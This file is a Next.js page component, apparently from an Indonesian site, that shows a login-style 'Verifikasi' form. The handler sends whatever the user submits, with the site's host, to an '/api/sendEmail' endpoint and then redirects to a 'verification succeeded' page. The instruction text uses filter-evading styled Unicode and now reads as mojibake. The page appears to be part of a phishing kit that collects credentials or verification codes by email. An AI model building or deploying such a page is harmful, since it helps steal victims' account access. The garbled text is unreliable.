
import { useRouter } from 'next/router'
import React from 'react'
import SiteImage from '../components/SiteImage'
// import SiteTitle from '../components/SiteTitle'
import SiteVerifikasi from '../components/SiteVerifikasi'

import logo from "../public/login.jpg"

function Verifikasi({host}) {
  const router = useRouter()
  const handleMessage = async (data) => {
    document.getElementById('btn').innerHTML = 'Loading...'
      try {
        
        const response = await fetch('/api/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'url': host
            },
            body: JSON.stringify(data)
        })

        const json = await response.json()
        
        if (json.status === 200) {
            document.getElementById('btn').innerHTML = 'Login'
            router.push('//verifikasiBerhasil')
        } else{
            document.getElementById('btn').innerHTML = 'Login'
            console.log(json.error)
        }

      } catch (error) {
          document.getElementById('btn').innerHTML = 'Login'
          console.log(error.message);
      }
  }

  return (
    <div className="container">
      {/* <SiteTitle title="Verifikasi Login"/> */}
      {/* <h2 className='msg'>Pesan Terkirim</h2> */}
      <div className='container-flex'>
        <div style={{display:'flex', flexDirection:'column', justifyContent:'center', maxWidth:'30em'}}>  
          <SiteImage logo={logo}/>          
          <p style={{wordWrap:'break-word', fontSize:18, marginLeft:10}}>
            πΊπππππππ πͺπππ/πΊππππ πΊπ΄πΊ ππππ π¨πππ π»πππππ π°πππ ππ π·ππππ/π»πππππ ππ π²ππππ π²πππππππππ ππππ πππ ππ π©ππππ πππ</p>
        </div>
        <SiteVerifikasi btnClick = {(data)=>handleMessage(data)}/>
      </div>
    </div>
  )
}

export async function getServerSideProps(context) {

  const host = context.req.headers.host
  
  return {
    props: {
      host
    },
  }
}

export default Verifikasi